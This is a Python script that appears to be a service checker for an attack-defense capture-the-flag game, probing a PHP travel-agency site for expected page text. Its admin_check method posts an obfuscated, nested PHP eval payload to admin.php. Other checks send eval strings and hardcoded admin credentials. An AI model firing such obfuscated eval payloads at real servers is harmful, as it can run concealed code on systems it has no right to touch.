# -*- coding:utf8 -*-
import requests as rq
import sys
my_time = "AAAA"
debug = True
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"}

class check():
    def __init__(self):
        a = 1

    def index_check(self):
        res = rq.get('http://%s:%s/index.php?file=news&cid=1&page=1&test=eval&time=%s' % (host,port,str(my_time)),headers=headers)
        if 'A Travel Agency' in res.text:
            return True
        if debug:
            print("[fail!] index_check_fail")
        return False
    

    def test_check(self):
        res = rq.get('http://%s:%s/contact.php?file=flag&time=%s' % (host,port,str(my_time)),headers=headers)
        if 'info@example.com' in res.text:
            return True
        if debug:
            print("[fail!] test_check_fail")
        return False


    def admin_check(self):
        headers['Cookie'] = ''
        data = base64.b64encode('eval($b($c($d($b($c($d($b($c($d($b($c($d("BcHJglAwAADQD2Uo0UsOPUtNR8UYVqkb1RhYcKT2r+975tP9ze/G4hhpcgKyhlHNeFY+VLqnCNUBq55lTggTDCQuMEAPeGsrZK35BnUpXBriUPk9VDxp4pL3x7iYj3YH5nIa0/qxXMRMsvmVjX7vkjjs0YYadh5onm96ALwKbaxC1cZgZt5MxBQAi7XfekgpnF0oRBHRVIaznEZaDjbMBJxLXlnLHEIqhMhPofY0PhV3WPsfvYhn7Prhxzc7tw1NLDh7XuS7O3ODKMbAvU1/vAx1kJDp9n59kK7eA84Sw1WUeZfpZTp9AQ==")))))))))))));');
        res = rq.post('http://%s:%s//admin.php?time=%s' % (host,port,str(my_time)),data=data,headers=headers)
        if 'theme_advanced_buttons1' in res.text:
            return True
        if debug:
            print("[fail!] admin_check_fail")
        return False
    

    def login_check(self):
        headers['Cookie'] = 'PHPSESSID=ujg0tpds1u9d23b969f2duj5c7;'
        res = rq.get('http://%s:%s/login.php?username=admin&password=admin123&captcha=a' % (host,port),headers=headers)
        if 'Forgot password' in res.text:
            return True
        if debug:
            print("[fail!] login_fail")
        return False

    def admin_index_check(self):
        data = 'eval(666)'
        headers['Cookie'] = 'PHPSESSID=ujg0tpds1u9d23b969f2duj5c7;'
        res = rq.get('http://%s:%s/index.php/admin/Index/main.html' % (host,port),data=data,headers=headers)
        tmp = rq.get('http://%s:%s/index.php/admin/index/logout.html'% (host,port),headers=headers)
        if '/var/www/html' in res.text:
            return True
        if debug:
            print("[fail!] admin_index fail")
        return False
    

def server_check():
    try:
        a = check()
        if not a.index_check():
            return False
        if not a.test_check():
            return False
        if not a.login_check():
            return False    
        return True
    except Exception as e:
        print(e)
        return False

if __name__ == '__main__':
    host = sys.argv[1]
    port = sys.argv[2]

    if server_check():
        # print("Host: "+host+" seems ok")
        pass
    else:
        print("team"+port[1:3])
        # print("Host: "+host+" seems down")


